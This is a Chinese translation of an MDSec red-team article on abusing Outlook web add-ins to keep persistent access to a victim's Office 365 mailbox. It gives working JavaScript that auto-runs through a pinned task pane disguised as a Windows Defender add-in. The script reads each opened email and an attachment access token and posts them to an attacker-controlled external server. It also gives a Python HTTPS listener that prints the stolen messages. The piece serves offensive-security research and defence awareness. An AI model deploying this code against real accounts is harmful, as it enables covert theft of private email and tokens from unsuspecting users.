# 如何滥用Office Web加载项

阅读量 **304619**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-25 14:30:41

 **x**

##### 译文声明

本文是翻译文章，文章原作者 mdsec，文章来源：mdsec.co.uk

原文地址：<https://www.mdsec.co.uk/2019/01/abusing-office-web-add-ins-for-fun-and-limited-profit/>

译文仅供参考，具体内容表达以及含义原文为准。

## 一、背景

开发者可以使用Office加载项（add-ins）平台来扩展Office应用功能、与文档内容进行交互。加载项使用HTML、CSS以及JavaScript语言开发，使用JavaScript与Office平台交互。

所有的Office产品中都包含对应的API，但本文主要关注的是Outlook这款产品。

开发者可以使用一个manifest（清单）文件来部署加载项，该文件中包含加载项对应的名称以及URL，其他所有文件（包括HTML以及JavaScript）都托管在我们自己的基础设施上。

加载项必须使用HTTPS协议进行通信，因此我们首先需要一个有效的HTTPS证书。在本文中，我在Digital Ocean
droplet中运行一个Apache实例，使用了Let’s Encrypt提供的证书。

## 二、已有研究成果

本文的某些灵感来自于Mike Felch和Beau Bullock去年在Wild West Hackin’
Fest上做的一次[演讲](https://www.youtube.com/watch?v=XFk-b0aT6cs)，演讲视频大约从第20分钟开始涉及这方面内容，主要关注的是可以在XSS攻击中使用的Web加载项。

在本文中，我们将展示如何构建加载项，以便持久访问受害者的邮箱账户。

## 三、构建加载项

如果安装了相应功能，那么Visual Studio可以支持三种加载项的开发。我们需要安装“Office/SharePoint
development”功能，才能使用VS开发加载项类型的项目。需要注意的是，即使不使用VS，我们也能创建这些加载项。Yeoman提供了一个加载项生成器，我们也可以使用文本编辑器，手动开发代码。

一旦我们创建适用于Outlook的加载项项目，VS就会帮我们构建一个基本的加载项，该加载项可以显示用户所收的电子邮件的相关信息。生成的加载项如下图所示，已部署到Office365中：

![](https://p3.ssl.qhimg.com/t01c5449b6a720748a4.png)

看起来可能效果一般，但我们的确可以访问所有的消息内容。

## 四、部署加载项

现在我们已经使用VS生成了一个基本的加载项，在修改加载项代码之前，我们需要仔细研究一下加载项的部署方式，了解这种方式对攻击过程的影响。

每个加载项都包含一个manifest文件，该文件是一个XML文档，其中包含加载项名称、某些配置选项以及资源地址。文件部分内容如下图所示，其中显示了我们的加载项所加载的部分资源：

    
    
    <Resources>
          <bt:Images>
            <bt:Image id="icon16" DefaultValue="https://www.two06.info/Images/icon16.png" />
            <bt:Image id="icon32" DefaultValue="https://www.two06.info/Images/icon32.png" />
            <bt:Image id="icon80" DefaultValue="https://www.two06.info/Images/icon80.png" />
          </bt:Images>
          <bt:Urls>
            <bt:Url id="functionFile" DefaultValue="https://www.two06.info/Functions/FunctionFile.html" />
            <bt:Url id="messageReadTaskPaneUrl" DefaultValue="https://www.two06.info/MessageRead.html" />
          </bt:Urls>
          <bt:ShortStrings>
            <bt:String id="groupLabel" DefaultValue="My Add-in Group" />
            <bt:String id="customTabLabel" DefaultValue="My Add-in Tab" />
            <bt:String id="paneReadButtonLabel" DefaultValue="Display all properties" />
            <bt:String id="paneReadSuperTipTitle" DefaultValue="Windows Defender 365 Email Security" />
          </bt:ShortStrings>
          <bt:LongStrings>
            <bt:String id="paneReadSuperTipDescription" DefaultValue="Opens a pane displaying all available properties. This is an example of a button that opens a task pane." />
          </bt:LongStrings>
        </Resources>
    

我们只需要这个文件就可以部署加载项，可以通过Office 365的web页面来部署：

![](https://p5.ssl.qhimg.com/t01809e5f25da1711a2.png)

在“Settings”页面中，我们可以看到一个“Manage add-ins”菜单项。在“My add-ins”页面中，我们可以找到自定义加载项选项，其中下拉列表中就包含上传manifest文件的选项。

![](https://p1.ssl.qhimg.com/t015d6d957a96867d9c.png)

我们只需上传manifest文件，O365就可以帮我们安装相应的加载项。

作为攻击者，我们需要想办法向受害者部署我们的加载项。一旦我们通过O365
web页面部署加载项，加载项就会同步到该账户的每个会话。这意味着我们可以从我们自己设备访问受害者账户，部署恶意加载项，并让加载项自动与受害者的浏览器同步。需要注意的是，虽然受害者不必注销，但必须重新加载Outlook
webapp，才能使改动生效。

我们还需要将加载项文件拷贝到我们的服务器上，包括HTML、CSS、JavaScript以及其他图像文件。

## 五、自动执行

为了武器化我们的加载项，我们需要让加载项能够自动执行：受害者无需点击按钮就能触发攻击行为。微软并不支持web加载项的自动执行，然而我们可以通过一些“黑科技”来完成这个任务。

如果我们观察前面VS生成的加载项，我们可以看到一个“pin”（固定）图标。该图标的功能非常明显，可以让Outlook保持该加载项处于打开状态，无需通过按钮点击来加载。我们需要启用该功能才能显示该图标，单纯生成加载项并不会出现该图标。

为了启用pin功能，我们需要修改manifest文件，添加`SupportsPinning`元素。只有schema为1.1版的manifest才支持这个元素，因此我们还需要覆盖这个字段。大家可以参考[此处](https://github.com/OfficeDev/outlook-dev-docs/blob/master/docs/add-ins/pinnable-taskpane.md)资料了解完整的示例。

覆盖版本号后，我们可以在manifest文件的`Action`标签中添加`SupportsPinning`标签，如下所示：

    
    
    <Action xsi:type="ShowTaskpane">
        <SourceLocation resid="messageReadTaskPaneUrl" />
        <SupportsPinning>true</SupportsPinning>
    </Action>
    

pin图标的状态（代表加载项是否保持加载状态）也会在使用O365账户的所有浏览器上同步，这意味着我们可以在自己的设备上访问目标i账户，部署并固定加载项。当受害者下一次访问自己的账户时，就会自动加载并执行我们的加载项。

## 六、读取邮件

既然我们可以部署自己的加载项，然后自动执行加载项，现在我们可以开始构造功能更丰富的加载项。在本文中，我们的目标是读取受害者的邮件。我们可以扩展攻击范围，比如用来发送消息、查看计划安排等，但就本文的演示场景而言，读取消息内容已经能够满足我们需求。

VS已经帮我们生成了我们所需的大部分代码。首先，我们需要访问`item`对象，我们可以通过`Office.context.mailbox.item`对象来访问`item`对象，该对象中包含与消息有关的所有值，如发件人、主题以及附件详情等。我们必须使用异步调用来访问邮件正文，例如，我们可以使用如下代码来访问某个`item`的正文内容：

    
    
    // Load properties from the Item base object, then load the
    // message-specific properties.
    function loadProps(args) {
        var item = args;
        var bodyText = "";
        var body = item.body;
        body.getAsync(Office.CoercionType.Text, function (asyncResult) {
            if (asyncResult.status !== Office.AsyncResultStatus.Succeeded) {
    
            }
            else {
                bodyText = asyncResult.value.trim();
                sendData(item, bodyText, serviceRequest);
            }
        });
    }
    

上述代码中的`sendData()`会将数据传回我们的服务器。在本文的演示场景中，我会使用同一台服务器来托管我们的加载项文件，但这并不是攻击的必要条件。该函数的代码非常简单，如下所示：

    
    
    //Send data to our server
    function sendData(item, body, attachmentToken) {
        var item_data = JSON.stringify(item);
        var body_data = JSON.stringify(body);
        var token_data = JSON.stringify(attachmentToken)
        $.ajax({
        url: 'https://www.two06.info:8000/listen',
        type: 'post',
        data: { item: item_data, item_body: body_data, token: token_data },
        success: function (response) {
            //todo
        }
        });
    }
    

在上述代码中大家可能会注意到`attachmentToken`这个值。我们无法通过JavaScript
API访问附件，虽然我们可以获取附件名及其他细节，但无法访问具体文件。为了访问附件，我们需要使用EWS
API。虽然我们可以直接使用受害者的凭据来向该API发起身份认证请求，但也可以使用JavaScript API获取Bearer
Token，利用该令牌访问附件。通过这种方式，即使受害者修改了密码，我们也能成功访问附件。我们可以使用另一个异步调用来获取令牌，如下所示：

    
    
    var serviceRequest = {
            attachmentToken: ''
        };
    
        function attachmentTokenCallback(asyncResult, userContext) {
            if (asyncResult.status === "succeeded") {
                //cache the result
                serviceRequest.attachmentToken = asyncResult.value;
            }
        }
        //Grab a token to access attachments
        function getAttachmentToken() {
            if (serviceRequest.attachmentToken == "") {
                Office.context.mailbox.getCallbackTokenAsync(attachmentTokenCallback);
            }
        }
    

接下来我们还需注册一个回调程序，以便在选定的邮件发生变化时接收通知。如果我们不执行该操作，那么当加载项加载后，只会给我们发送第一封邮件的详细信息：

    
    
    // The Office initialize function must be run each time a new page is loaded. 
        Office.initialize = function (reason) {
            $(document).ready(function () {
                //register the ItemChanged event hander then call the loadProps method to grab some data
                Office.context.mailbox.addHandlerAsync(Office.EventType.ItemChanged, itemChanged);
                //fire off the call to get the callback token we need to download attachments - not needed yet but its just easier this way
                getAttachmentToken();
                loadProps(Office.context.mailbox.item);
        });
        };
    
    //event handler for item change event (i.e. new message selected)
        function itemChanged(eventArgs) {
            loadProps(Office.context.mailbox.item);
        }
    

## 七、接收数据

现在我们已经创建能够发送已选定邮件详细信息的JavaScript代码。我们还需要使用其他代码来捕捉并显示这些信息。由于加载项必须使用HTTPS协议进行通信，因此我们的监听器必须能够接受HTTPS流量。我们可以修改基于HTTP服务器的Python3代码，完成该任务：

    
    
    class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Hello')
    
        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            self.send_response(200)
            self.end_headers()
            response = BytesIO()
            response.write(b'Hello')
            self.wfile.write(response.getvalue())
            decoded = unquote(body.decode("utf-8"))
            Helpers.print_Message(decoded)
    
    httpd = HTTPServer(('', 8000), SimpleHTTPRequestHandler)
    httpd.socket  = ssl.wrap_socket(httpd.socket, keyfile=' /certs/privkey.pem', certfile=' /certs/cert.pem', server_side=True)
    
    httpd.serve_forever()
    

这里我们覆盖了GET及POST处理函数，创建了所需的证书文件，以便正确接收HTTPS请求。

接下来，我们需要处理加载项发送过来的JSON数据。我们可以在客户端处理这些数据，只发送我们感兴趣的部分数据。然而让客户端发送所有可用的数据，并让我们的处理程序处理这些数据也是不错的选择。通过这种方法，我们可以根据具体需求提取其他数据：

    
    
    class Helpers:
        def HTMLDecode(s):
            return s.replace("+", " ")
    
        def buildEmail(address):
            return address['name'] + " <" + address['address'] + ">"
    
        def buildEmailAddresses(addresses):
            if addresses:
                returnString = ""
                for address in addresses:
                    returnString = returnString + Helpers. buildEmail(address) + 'n'
                return returnString
            return "None"
    
        def getAttachmentName(attachment):
            return attachment['name'] + " (ID:" + attachment['id'] +")"
    
        def getAttachments(attachments):
            if attachments:
                returnString = ""
                for attachment in attachments:
                    returnString = returnString + Helpers.getAttachmentName(attachment) + 'n'
                return returnString
            return "0"
    
        def print_Message(decoded_data):
            #split the string into item data and body data
            split = decoded_data.partition("&item_body=")
            item_json = split[0]
            #now we need the body data and the token data
            split2 = split[2].partition("&token=")
            body_data = split2[0]
            token_data = split2[2]
            #item_json now needs to be parsed to grab what we need
            #strip the first 5 chars ("item=") from the json data
            parsed_json = json.loads(item_json[5:])
            item_json = parsed_json['_data$p$0']['_data$p$0']
            #we also need to parse the token object
            token_json = json.loads(token_data)
            #grab the values we want to display
            _from = Helpers.buildEmail(item_json['from'])
            _sender = Helpers.buildEmail(item_json['sender'])
            _to = Helpers.buildEmailAddresses(item_json['to'])
            _subject = item_json['subject']
            _attachment_count = Helpers.getAttachments(item_json.get("attachments", None))
            _ewsUrl = item_json['ewsUrl']
            _token = token_json['attachmentToken']
            print(Fore.RED + "[*] New Message Received" + Style.RESET_ALL)
            print("From: " + Helpers.HTMLDecode(_from))
            print("Sender: " + Helpers.HTMLDecode(_sender))
            print("To: " + Helpers.HTMLDecode(_to))
            print("Subject: " + Helpers.HTMLDecode(_subject))
            print("Body: " + Helpers.HTMLDecode(body_data))
            if _attachment_count != "0":
                print("Attachment Details: n")
                print(Helpers.HTMLDecode(_attachment_count))
                print("Use these values to download attachments...n")
                print("ewsURL: " + _ewsUrl)
                print("Access Token: " + _token)
            print(Fore.RED + "------------------------" + Style.RESET_ALL)
    

具体的函数代码这里不再赘述，最终我们可以利用上述代码解析JSON数据，将其拆分成item、正文以及API Token对象，提取并打印出我们感兴趣的信息。

现在如果我们部署构造好的加载项，当受害者访问邮件时我们应该能捕捉到邮件的具体内容：

![](https://p4.ssl.qhimg.com/t01d8deba780e7a1c4d.png)

上图中我隐去了API令牌信息，然而攻击者可以使用API令牌来访问EWS
API，下载附件。虽然这超出了本文的研究范围，但需要注意的是，这个令牌只限于特定的附件ID，似乎不能用来进一步访问API。

## 八、界面问题

还有一件事情现在我们还没有真正去考虑：HTML页面。Mike和Beau在Wild West Hackin’
Fest的演讲中提到，攻击者有可能隐藏加载项的UI。不幸的是，目前我尚未成功复现这种场景。虽然有人曾要求官方添加该功能，但该功能似乎尚未开发出来。在研究过程中，我们一直能看到固定大小的一个附加项面板。

为了解决这个问题，攻击者可以采取一些社会工程学方法。我们可以按照自己喜欢的方式设置加载项的样式，在这个演示场景中，我将其伪装成一个Windows
Defender的插件：

![](https://p2.ssl.qhimg.com/t01eb7c9097a5031804.png)

最终，我们可以自己设置加载项的样式以适配目标环境，但直到目前为止，我们依然无法删除UI。

## 九、总结

在本文中，我们介绍了如何利用Office JavaScript
API来获得受害者邮箱的持久访问权限。在这个攻击场景中，我们通过凭据破解或者其他攻击手段获取了目标邮箱访问权限，然后部署了一个加载项，这样即使受害者更改了密码，我们也能持续访问目标收件箱内容。不幸的是，我们必须依赖一些社会工程学技巧，因为（目前）我们无法隐藏加载项的UI。

我们还可以通过其他方式来利用web加载项。我们可以为其他Office产品构建加载项，获取电子表格、演示文稿和SharePoint内容的访问权限。如果目标使用内部开发的加载项，我们还能修改JavaScript文件，使其包含恶意内容。微软并没有在manifest文件中包含任何文件签名机制，因此无法阻止我们修改JavaScript文件。

微软还允许开发人员将这些加载项推送到应用商店中，用户可以通过应用商店来安装加载项，这种方式隐藏的风险不言而喻。

最后还需要注意一点，当通过O365门户进行部署时，这些加载项也会与桌面版的Outlook应用同步。不幸的是，前文提到的pin功能似乎无法在web门户和桌面应用之间同步。如果未来这一点有所变化，那么这种攻击方法就更有用武之地。

本文翻译自mdsec.co.uk [原文链接](https://www.mdsec.co.uk/2019/01/abusing-office-web-add-ins-for-fun-and-limited-profit/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/170192](/post/id/170192)

安全客 - 有思想的安全新媒体

本文转载自: [mdsec.co.uk](https://www.mdsec.co.uk/2019/01/abusing-office-web-add-ins-for-fun-and-limited-profit/)

如若转载,请注明出处： <https://www.mdsec.co.uk/2019/01/abusing-office-web-add-ins-for-fun-and-limited-profit/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [Office](/tag/Office)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

